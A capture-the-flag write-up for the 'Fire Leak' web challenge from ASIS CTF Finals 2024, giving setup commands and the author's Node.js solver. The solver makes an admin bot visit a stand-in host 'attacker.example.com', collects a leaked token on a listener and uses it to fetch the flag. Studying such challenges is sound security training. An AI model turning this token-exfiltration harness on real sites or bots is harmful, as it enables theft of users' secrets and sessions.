---
title: "Fire Leak - ASIS CTF Finals 2024"
category: "web"
type: "writeup"
tags: ["arkark-my-ctf-challenges", "author-solution", "challenge-source", "fire", "leak", "web", "asis-ctf-finals-2024"]
summary: "It's time to leak quickly."
source:
  name: "arkark/my-ctf-challenges"
  url: "https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202412_ASIS_CTF_Finals_2024/web/fire-leak"
license: "none stated"
ctf:
  name: "ASIS CTF Finals 2024"
  year: 2024
  challenge: "Fire Leak"
---

## Challenge

- **Author:** [arkark](https://github.com/arkark)
- **Source:** <https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202412_ASIS_CTF_Finals_2024/web/fire-leak>
- **CTF:** ASIS CTF Finals 2024

---

# [web] fire-leak

## Description

It's time to leak quickly.

- Challenge: `http://fire-leak.asisctf.com:3000`
- Admin bot: `http://fire-leak.asisctf.com:1337`

## Attachments

- [fire-leak](distfiles)

## Usage

Launch a challenge server:

```
cd challenge
docker compose up
```

Run the author's solver:
```
docker run -it --rm \
    -e BOT_BASE_URL=http://localhost:1337 \
    -e WEB_BASE_URL=http://localhost:1337 \
    -e CONNECTBACK_URL=http://attacker.example.com \
    -p 8080:8080 --network=host \
    (docker build -q ./solution)
```
where `http://attacker.example.com` is an origin forwarded to `http://localhost:8080`.


## Solver: `index.js`

<https://github.com/arkark/my-ctf-challenges/blob/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202412_ASIS_CTF_Finals_2024/web/fire-leak/solution/index.js>

```javascript
const path = require("node:path");
const app = require("fastify")();

app.register(require("@fastify/static"), {
  root: path.join(__dirname, "public"),
});

const fail = (message) => {
  console.error(message);
  return process.exit(1);
};

const BOT_BASE_URL = process.env.BOT_BASE_URL ?? "http://localhost:1337";
const WEB_BASE_URL = process.env.WEB_BASE_URL ?? "http://localhost:3000";
const CONNECTBACK_URL = process.env.CONNECTBACK_URL ?? fail("No URL");
const PORT = "8080";

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const reportUrl = (url) =>
  fetch(`${BOT_BASE_URL}/api/report`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ url }),
  }).then((r) => r.text());

app.post("/debug", async (req, reply) => {
  console.debug("[DEBUG] " + req.body);
});

app.post("/token", async (req, reply) => {
  const token = req.body;
  console.log({ token });

  // You got a flag!
  const flag = await fetch(`${WEB_BASE_URL}/get?token=${token}`).then((r) =>
    r.text()
  );
  console.log({ flag });
  process.exit(0);
});

app.listen({ port: PORT, host: "0.0.0.0" }, async (err) => {
  if (err) fail(err);

  await sleep(3 * 1000);
  await reportUrl(
    `${CONNECTBACK_URL}?${new URLSearchParams({
      baseUrl: "http://web:3000",
    })}`
  );

  await sleep(5 * 1000);
  fail("Failed");
});
```
